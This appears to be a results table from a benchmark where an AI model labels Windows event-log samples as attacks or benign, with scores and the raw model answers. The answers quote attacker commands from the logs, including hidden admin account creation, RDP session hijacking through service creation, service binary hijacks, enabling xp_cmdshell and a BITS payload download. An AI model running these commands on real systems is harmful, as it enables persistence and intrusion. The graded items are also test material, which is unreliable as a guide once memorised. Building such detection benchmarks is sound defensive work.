# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,"ID472, 4728 Hidden user creation.evtx",easy,B,processed,YES,100.0,70.0,YES,"1102, 4688, 4656, 4728, 4720, 4722, 4738, 4724, 4732, 4733, 4729, 4726, 4660","C:\TOOLS\CreateHiddenAccount_upx_v0.2.exe, C:\Windows\System32\netdom.exe, C:\Windows\System32\lsass.exe, C:\Windows\regedit.exe","admmig, 3teamssixf$","CreateHiddenAccount_upx_v0.2.exe  -u 3teamssixf -p Passw0rd, netdom query pdc, regedit /s .sTRmxJkRFoTFaPRXBeavZhjaAYNvpYko.reg",,,0.0,7.75,4.2,6.0,4.0,4,18.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4656, 4728, 4720, 4722, 4738, 4724, 4732, 4733, 4729, 4726, 4660
- Processes: C:\TOOLS\CreateHiddenAccount_upx_v0.2.exe, C:\Windows\System32\netdom.exe, C:\Windows\System32\lsass.exe, C:\Windows\regedit.exe
- Accounts: admmig, 3teamssixf$
- Commands: CreateHiddenAccount_upx_v0.2.exe  -u 3teamssixf -p Passw0rd, netdom query pdc, regedit /s .sTRmxJkRFoTFaPRXBeavZhjaAYNvpYko.reg
- Network: None
- Registry: None

EXPLANATION:
The sequence begins with the Security log being cleared (1102) followed by execution of a UPX-packed ""CreateHiddenAccount"" tool that creates a machine-style account ""3teamssixf$"" (4720), enables it (4722), and adds it to the Builtin Administrators group (4732), establishing a hidden privileged backdoor. The use of regedit /s with a random-named .reg file to hide the account and the rapid programmatic group additions/removals (4728/4729/4733) and account deletion (4726) are classic attacker anti-forensic and persistence techniques. This combination of log clearing, hidden account creation, and privilege escalation is clearly malicious."
claude-opus-4-8,ID4720-4726 Fast created-deleted user.evtx,easy,A,processed,YES,100.0,100.0,YES,"4720, 4726",,"admin-kriss, lambda-user",,,,0.0,4.01,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4720, 4726
- Processes: None
- Accounts: admin-kriss, lambda-user
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
A non-privileged account (lambda-user) created a new account named ""admin-kriss"" (Event 4720) and then deleted it roughly 78 seconds later (Event 4726) on the domain controller rootdc1.offsec.lan. This rapid create-then-delete of an admin-style account by the same actor is a classic anti-forensic pattern indicating malicious account manipulation rather than routine administration."
claude-opus-4-8,ID4720-Admin like user created.evtx,easy,A,processed,YES,100.0,100.0,YES,4720,,"admin-kriss, lambda-user",,,,0.0,3.88,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4720
- Processes: None
- Accounts: admin-kriss, lambda-user
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
A user account creation (Event 4720) was performed by a non-administrative actor ""lambda-user"" creating a privileged-looking account ""admin-kriss"" with a disabled/no-password-required UAC configuration (NewUacValue 0x15 includes ACCOUNTDISABLE and PASSWD_NOTREQD). The creation of an admin-named account by a standard user with weak password settings on a domain controller is consistent with privilege escalation or persistence activity, warranting investigation."
claude-opus-4-8,ID4720-Fake computer account created.evtx,easy,A,processed,YES,100.0,100.0,YES,4720,,"FAKE-COMPUTER$, lambda-user",,rootdc1.offsec.lan,,0.0,4.05,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4720
- Processes: None
- Accounts: FAKE-COMPUTER$, lambda-user
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
A non-privileged user account (lambda-user) created a new machine account (FAKE-COMPUTER$) on a domain controller, which is a hallmark of attacks like the noPac/sAMAccountName spoofing or machine account quota abuse used to facilitate privilege escalation. The PrimaryGroupId 513 (Domain Users) combined with a computer-style account name created by a regular user is anomalous and indicative of adversarial account staging rather than routine administrative provisioning."
claude-opus-4-8,ID4720-Local user created.evtx,easy,A,processed,YES,100.0,83.3,YES,"4720, 4732",,"hacking-local-acct, admmig",,,,0.0,3.72,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4720, 4732
- Processes: None
- Accounts: hacking-local-acct, admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
A new local account named ""hacking-local-acct"" was created (Event 4720) on jump01.offsec.lan by admmig and immediately added to the Builtin\Users group (Event 4732) within the same fraction of a second. The suspicious account name and the rapid create-then-add-to-group sequence on a jump host are consistent with attacker persistence/backdoor account creation rather than routine administration."
claude-opus-4-8,ID4722-Guest account activated.evtx,easy,A,processed,YES,100.0,100.0,YES,4722,,"Guest, admmig",,,,0.0,3.15,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4722
- Processes: None
- Accounts: Guest, admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Event 4722 shows the built-in Guest account being enabled on jump01.offsec.lan by the account admmig. Enabling the normally-disabled Guest account is a common persistence and privilege/access technique used by attackers to maintain a low-profile foothold, making this activity suspicious."
claude-opus-4-8,ID4741-Computer account created with privileges.evtx,easy,A,processed,YES,100.0,100.0,YES,4741,,"hack1, compnay-88$",,rootdc1.offsec.lan,,0.0,5.63,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4741
- Processes: None
- Accounts: hack1, compnay-88$
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
A computer account (compnay-88$) was created on the domain controller by the user ""hack1"" using SeMachineAccountPrivilege, with the PrimaryGroupId 515 indicating a domain computer. The creation of an attacker-named machine account (suspicious typo ""compnay"") by a non-administrative user account named ""hack1"" is consistent with abuse of MachineAccountQuota for attacks such as resource-based constrained delegation or noPac/sAMAccountName spoofing. This pattern of unexpected machine-account creation on a DC by a suspicious user is indicative of malicious privilege-escalation activity."
claude-opus-4-8,ID4742-4743-Fast created & deleted computer account.evtx,easy,A,processed,YES,100.0,100.0,YES,"4742, 4743",,"HIDDEN-PC$, ANONYMOUS LOGON, lambda-user",,,,0.0,4.80,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4742, 4742, 4743
- Processes: None
- Accounts: HIDDEN-PC$, ANONYMOUS LOGON, lambda-user
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
A computer account (HIDDEN-PC$) was modified by an ANONYMOUS LOGON (S-1-5-7) with a PasswordLastSet change, immediately followed by UAC changes (0x85 to 0x84) and then deletion (4743) of the same computer account by lambda-user, all within seconds on a domain controller. The use of ANONYMOUS LOGON to set a machine account password combined with rapid UAC flag manipulation and account deletion is consistent with credential/computer-account abuse attacks (e.g., resource-based constrained delegation or sAMAccountName/machine-account exploitation)."
claude-opus-4-8,ID3-59-60-BITS job created.evtx,easy,A,processed,YES,100.0,83.3,YES,"3, 310, 59, 60, 4",C:\Windows\System32\bitsadmin.exe,OFFSEC\admmig,,https://www.ma-neobanque.com/wp-content/uploads/2020/11/carte-max-premium.jpg,,0.0,4.03,5.0,6.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 3, 310, 59, 60, 4
- Processes: C:\Windows\System32\bitsadmin.exe
- Accounts: OFFSEC\admmig
- Commands: None
- Network: https://www.ma-neobanque.com/wp-content/uploads/2020/11/carte-max-premium.jpg
- Registry: None

EXPLANATION:
The use of bitsadmin.exe to create a BITS transfer job (""hackingarticles"") that downloads a file disguised as a .jpg from an external URL is a known living-off-the-land technique (T1197) for stealthy payload delivery. The job naming, external download source, and use of BITS to evade detection indicate malicious activity rather than routine Windows update transfers."
claude-opus-4-8,ID4688-BITS transfer initiated.evtx,easy,A,processed,YES,100.0,90.0,YES,4688,"bitsadmin.exe, cmd.exe, dllhost.exe, svchost.exe","admmig, JUMP01$","bitsadmin  /transfer hackingarticles https://www.ma-neobanque.com/wp-content/uploads/2020/11/carte-max-premium.jpg c:\ignite.png, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",https://www.ma-neobanque.com/wp-content/uploads/2020/11/carte-max-premium.jpg,,0.0,5.65,5.4,6.0,4.0,4,19.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: bitsadmin.exe, cmd.exe, dllhost.exe, svchost.exe
- Accounts: admmig, JUMP01$
- Commands: bitsadmin  /transfer hackingarticles https://www.ma-neobanque.com/wp-content/uploads/2020/11/carte-max-premium.jpg c:\ignite.png, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
- Network: https://www.ma-neobanque.com/wp-content/uploads/2020/11/carte-max-premium.jpg
- Registry: None

EXPLANATION:
The account admmig launched bitsadmin.exe from cmd.exe to download a remote file disguised as a JPG image and save it locally as ignite.png, a classic living-off-the-land BITS-based payload download technique. The subsequent DllHost.exe spawned by svchost.exe with a specific COM CLSID is consistent with UAC bypass / COM elevation behavior tied to the same admmig logon, indicating an attack chain rather than routine activity."
claude-opus-4-8,ID60-High volume file downloaded with BITS.evtx,easy,A,processed,NO,100.0,83.3,YES,"3, 5, 59, 60",,OFFSEC\admmig,,https://releases.ubuntu.com/20.04.3/ubuntu-20.04.3-desktop-amd64.iso,,0.0,3.93,5.0,6.0,4.0,2,17.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 3, 5, 59, 60
- Processes: None
- Accounts: OFFSEC\admmig
- Commands: None
- Network: https://releases.ubuntu.com/20.04.3/ubuntu-20.04.3-desktop-amd64.iso
- Registry: None

EXPLANATION:
The events show BITS transfer jobs owned by OFFSEC\admmig downloading a legitimate Ubuntu desktop ISO from the official releases.ubuntu.com domain. While BITS is sometimes abused for stealthy downloads, the destination is a well-known trusted source and the file is a standard OS image, indicating routine administrative activity rather than malicious behavior."
claude-opus-4-8,ID800-4103-4104-PowerShell BITS job started.evtx,medium,B,processed,YES,100.0,56.7,YES,"800, 4104, 4103","powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",OFFSEC\admmig,Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination C:\Users\bits.ps1,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md,,0.0,5.97,3.4,6.0,4.0,3,16.4,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: powershell.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination C:\Users\bits.ps1
- Network: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md
- Registry: None

EXPLANATION:
The logs show the use of Start-BitsTransfer to download a remote file from an external GitHub URL to C:\Users\bits.ps1, which corresponds to MITRE ATT&CK technique T1197 (BITS Jobs) used for stealthy ingress tool transfer/persistence. The source URL explicitly references the atomic-red-team T1197 test, indicating adversary-simulation behavior abusing the BITS service to fetch a payload. This pattern of abusing a legitimate Windows transfer mechanism to pull external content is consistent with malicious download activity."
claude-opus-4-8,ID11-Exchange transport config modified.evtx,easy,A,processed,NO,100.0,100.0,YES,11,C:\Program Files\Notepad++\notepad++.exe,,,,,0.0,4.05,6.0,1.0,4.0,2,13.0,C,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 11
- Processes: C:\Program Files (x86)\Notepad++\notepad++.exe
- Accounts: None
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
This is a Sysmon FileCreate (Event ID 11) event showing Notepad++ writing to the Exchange transport agents.config file. While editing agents.config can be associated with malicious transport agent persistence, a single file-write event by a text editor with no accompanying suspicious process chain, network activity, or privilege escalation is insufficient to confirm an attack and appears consistent with routine administrative editing."
claude-opus-4-8,ID6-Failed to install an Exchange transport agent.evtx,easy,A,processed,YES,100.0,100.0,YES,6,"w3wp#MSExchangePowerShellAppPool, NetshHelperBeacon.dll",offsec.lan/OFFSEC-COMPANY/Administrators/admmig,"Install-TransportAgent -Name ""Evil"" -AssemblyPath "".\NetshHelperBeacon.dll"" -TransportAgentFactory ""hack"", Enable-TransportAgent -Identity ""hack""","exchange01.offsec.lan, rootdc1.offsec.lan",,16.7,6.02,6.0,6.0,3.3,3,18.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 6
- Processes: w3wp#MSExchangePowerShellAppPool, NetshHelperBeacon.dll
- Accounts: offsec.lan/OFFSEC-COMPANY/Administrators/admmig
- Commands: Install-TransportAgent -Name ""Evil"" -AssemblyPath "".\NetshHelperBeacon.dll"" -TransportAgentFactory ""hack"", Enable-TransportAgent -Identity ""hack""
- Network: exchange01.offsec.lan, rootdc1.offsec.lan
- Registry: None

EXPLANATION:
An admin account attempted to install a malicious Exchange Transport Agent named ""Evil"" loading ""NetshHelperBeacon.dll"" (a known malicious backdoor DLL) and then enable the ""hack"" agent, a classic Exchange persistence technique. The naming, assembly, and sequential install/enable attempts via remote PowerShell strongly indicate an attacker establishing mail-flow-based persistence, not routine administration."
claude-opus-4-8,ID11715-SQL Server started in single mode for psw recovery.evtx,easy,A,processed,NO,100.0,100.0,YES,17115,MSSQL$RADAR,,"-s ""RADAR"" -m",,,0.0,3.27,6.0,2.0,4.0,3,15.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 17115
- Processes: MSSQL$RADAR
- Accounts: None
- Commands: -s ""RADAR"" -m
- Network: None
- Registry: None

EXPLANATION:
Event ID 17115 from the MSSQL$RADAR provider is a routine SQL Server startup message indicating the server is starting with the named instance ""RADAR"" in single-user mode (-m) with the specified instance parameter (-s). This is normal SQL Server initialization behavior and contains no indicators of malicious activity."
claude-opus-4-8,ID15457-SQL server CLR lateral movement.evtx,easy,A,processed,YES,100.0,100.0,YES,15457,,,"show advanced options, 1, 1, clr enabled, 0, 1",,,0.0,3.49,6.0,6.0,4.0,2,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 15457
- Processes: None
- Accounts: None
- Commands: show advanced options, 1, 1, clr enabled, 0, 1
- Network: None
- Registry: None

EXPLANATION:
These paired sp_configure changes enable ""show advanced options"" and then ""clr enabled"" on the SQL Server, a common precursor to executing CLR-based code or assemblies for code execution. Enabling CLR immediately after exposing advanced options is a known SQL Server attack technique used to run malicious managed code, indicating potential abuse rather than routine administration."
claude-opus-4-8,ID15457-SQL Server CMDshell enabled.evtx,easy,A,processed,YES,100.0,88.9,YES,"15457, 33205",xp_cmdshell,"OFFSEC\admmig, dbo","xp_cmdshell, 0, 1, RECONFIGURE",,,0.0,7.11,5.3,6.0,4.0,4,19.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 15457, 33205
- Processes: xp_cmdshell
- Accounts: OFFSEC\admmig, dbo
- Commands: xp_cmdshell, 0, 1, RECONFIGURE;
- Network: None
- Registry: None

EXPLANATION:
Event 15457 shows the ""xp_cmdshell"" configuration option being changed from 0 to 1, and event 33205 records a RECONFIGURE statement by OFFSEC\admmig committing that change. Enabling xp_cmdshell allows execution of arbitrary OS commands from within SQL Server, a common attacker technique for gaining shell access and lateral movement. The paired config-change and RECONFIGURE sequence by the same principal is a strong indicator of malicious privilege/command-execution enablement."
claude-opus-4-8,ID4688-SQL Server started in single mode for psw recovery.evtx,easy,A,processed,YES,100.0,93.8,YES,4688,"net.exe, net1.exe, dllhost.exe, sqlservr.exe, powershell.exe, svchost.exe, services.exe","admmig, MSSQL01$, Svc-SQL-DB01","""C:\Windows\system32\net.exe"" start MSSQL$RADAR /m, C:\Windows\system32\net1 start MSSQL$RADAR /m, ""C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe"" -sRADAR",,,0.0,5.40,5.6,6.0,4.0,3,18.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: net.exe, net1.exe, dllhost.exe, sqlservr.exe, powershell.exe, svchost.exe, services.exe
- Accounts: admmig, MSSQL01$, Svc-SQL-DB01
- Commands: ""C:\Windows\system32\net.exe"" start MSSQL$RADAR /m, C:\Windows\system32\net1 start MSSQL$RADAR /m, ""C:\Program Files\Microsoft SQL Server\MSSQL12.RADAR\MSSQL\Binn\sqlservr.exe"" -sRADAR
- Network: None
- Registry: None

EXPLANATION:
PowerShell spawned net.exe to start the SQL Server instance MSSQL$RADAR with the /m single-user mode flag, a known technique to gain sysadmin-level access to SQL Server by restarting it in maintenance mode. The chain (powershell.exe → net.exe → net1.exe) followed by sqlservr.exe restarting under the SQL service account indicates deliberate privilege abuse rather than routine service operation. The use of /m single-user mode to bypass SQL Server authorization is a strong indicator of malicious escalation."
claude-opus-4-8,ID4688-sqlcmd tool abuse in SQL Server.evtx,easy,A,processed,NO,100.0,100.0,YES,4688,"SQLCMD.EXE, cmd.exe",admmig,"sqlcmd  -S .\RADAR,2020",,,0.0,3.28,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4688
- Processes: SQLCMD.EXE, cmd.exe
- Accounts: admmig
- Commands: sqlcmd  -S .\RADAR,2020
- Network: None
- Registry: None

EXPLANATION:
This event shows the admmig account launching SQLCMD.EXE from cmd.exe to connect to a local SQL Server instance (.\RADAR on port 2020), which is consistent with routine database administration. There is no indication of privilege escalation, suspicious network connections, or known attack tooling in the single observed event."
claude-opus-4-8,ID13-New service for Mimikatz.evtx,easy,A,processed,YES,100.0,83.3,YES,13,C:\Windows\system32\services.exe,,,,"HKLM\System\CurrentControlSet\Services\mimidrv\Start, HKLM\System\CurrentControlSet\Services\mimidrv\ImagePath",0.0,4.05,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 13
- Processes: C:\Windows\system32\services.exe
- Accounts: None
- Commands: None
- Network: None
- Registry: HKLM\System\CurrentControlSet\Services\mimidrv\Start, HKLM\System\CurrentControlSet\Services\mimidrv\ImagePath

EXPLANATION:
The events show the registration of the ""mimidrv"" service with its ImagePath pointing to mimidrv.sys, the kernel driver component of Mimikatz, a well-known credential-theft tool. Setting the Start value to 0x2 (auto-start) and loading this driver via services.exe indicates an attacker is installing the Mimikatz driver to enable privileged credential dumping or process protection bypass."
claude-opus-4-8,ID4688-4697 RDP hijack via service creation.evtx,easy,A,processed,YES,100.0,87.5,YES,"1102, 4688, 4697","C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe",admmig,"sc.exe  create hijackservice binpath= ""cmd.exe /k tscon 2 /dest:rdp-tcp#5"", cmd.exe /k tscon 2 /dest:rdp-tcp#5",,,0.0,4.48,5.2,6.0,4.0,4,19.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4697
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: sc.exe  create hijackservice binpath= ""cmd.exe /k tscon 2 /dest:rdp-tcp#5"", cmd.exe /k tscon 2 /dest:rdp-tcp#5
- Network: None
- Registry: None

EXPLANATION:
The security log was cleared (Event 1102) immediately before a service named ""hijackservice"" was created running as LocalSystem with a binpath invoking ""tscon 2 /dest:rdp-tcp#5"", a well-known RDP session hijacking technique to take over another user's session without credentials. The combination of log clearing (anti-forensics), service creation for privilege escalation to SYSTEM, and the tscon session-hijack command all by the same actor (admmig) strongly indicates malicious activity."
claude-opus-4-8,ID4688-Command SC to create service on remote host.evtx,easy,A,processed,YES,100.0,80.0,YES,4688,"C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe",admmig,"sc  \\fs02\ create hacker-testl binPath=""virus.exe""",\\fs02\,,0.0,3.82,4.8,6.0,4.0,3,17.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: sc  \\fs02\ create hacker-testl binPath=""virus.exe""
- Network: \\fs02\
- Registry: None

EXPLANATION:
The sc.exe command remotely creates a new service on host fs02 with a suspicious binary path of ""virus.exe"", indicating attempted remote service installation for persistence or lateral movement. The service name ""hacker-testl"" and binary ""virus.exe"" are strong indicators of malicious intent rather than legitimate administration."
claude-opus-4-8,ID4688-Service abuse with Failure Command.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\reg.exe, C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe",admmig,"REG  ADD ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time"" /v FailureCommand /t REG_SZ /d ""C:\tmp\pentestlab.exe"", sc  failure W32Time command= ""\""c:\Windows\system32\pentestlab.exe\""""",,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time,0.0,5.49,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: REG  ADD ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time"" /v FailureCommand /t REG_SZ /d ""C:\tmp\pentestlab.exe"", sc  failure W32Time command= ""\""c:\Windows\system32\pentestlab.exe\""""
- Network: None
- Registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time

EXPLANATION:
The same actor (admmig) sequentially modifies the W32Time service via reg.exe and sc.exe to set a FailureCommand/recovery action pointing to a suspicious binary (pentestlab.exe). This is a service failure-action abuse persistence/execution technique that causes the OS to run an attacker-controlled executable when the service fails, indicating malicious activity."
claude-opus-4-8,ID4688-Service abuse with malicious path.evtx,easy,A,processed,YES,100.0,93.3,YES,4688,"C:\Windows\System32\sc.exe, C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Users\admmig\AppData\Local\Microsoft\OneDrive\21.180.0905.0007\FileCoAuth.exe, C:\Windows\System32\svchost.exe","admmig, WIN10-02$","sc  config xboxgip binPath= ""C:\windows\system32\pentestlab.exe"", reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xboxgip"" /v ImagePath /t REG_SZ /d ""C:\tmp\pentestlab.exe""",,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xboxgip,0.0,6.25,5.6,6.0,4.0,4,19.6,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688, 4688
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Users\admmig\AppData\Local\Microsoft\OneDrive\21.180.0905.0007\FileCoAuth.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, WIN10-02$
- Commands: sc  config xboxgip binPath= ""C:\windows\system32\pentestlab.exe"", reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xboxgip"" /v ImagePath /t REG_SZ /d ""C:\tmp\pentestlab.exe""
- Network: None
- Registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xboxgip

EXPLANATION:
The admmig account modified an existing service (xboxgip) to point its binary path to a suspicious executable named pentestlab.exe, first via sc.exe config and then by directly editing the service's ImagePath registry key. This service binary hijacking pattern targeting a legitimate-sounding service to execute a non-standard binary in temp/system directories is a classic persistence and privilege escalation technique. The combination of paired sc config and reg add operations on the same service identifier confirms malicious intent."
claude-opus-4-8,ID4688-Service created (command).evtx,easy,A,processed,YES,100.0,87.5,YES,4688,"C:\Windows\System32\sc.exe, C:\Windows\System32\taskhostex.exe","admmig, FS03$","sc  create hacker-testl3 binPath=""3virus.exe"", taskhostex.exe",,,0.0,5.03,5.2,6.0,4.0,4,19.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\taskhostex.exe
- Accounts: admmig, FS03$
- Commands: sc  create hacker-testl3 binPath=""3virus.exe"", taskhostex.exe
- Network: None
- Registry: None

EXPLANATION:
The account admmig used sc.exe to create a new service named ""hacker-testl3"" pointing to a suspicious binary ""3virus.exe"", which is a classic persistence and code-execution technique. The naming of both the service and the binary path strongly indicates malicious intent rather than legitimate administrative service creation."
claude-opus-4-8,ID4688-Service permissions modified (registry).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\dllhost.exe, C:\Windows\System32\svchost.exe","admmig, WIN10-02$","reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security"" /v Security /t REG_BINARY /d fe340ead, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security,0.0,5.95,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: C:\Windows\System32\reg.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\dllhost.exe, C:\Windows\system32\DllHost.exe, C:\Windows\System32\svchost.exe
- Accounts: admmig, WIN10-02$
- Commands: reg  add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security"" /v Security /t REG_BINARY /d fe340ead, C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
- Network: None
- Registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave\Security

EXPLANATION:
The admmig account spawned reg.exe via cmd.exe to overwrite the Security descriptor of the XblGameSave service registry key, a known technique to tamper with service permissions for privilege escalation or persistence. This is immediately followed by an elevated dllhost.exe COM surrogate launch under the same logon ID, consistent with a UAC bypass / elevation chain rather than routine service configuration."
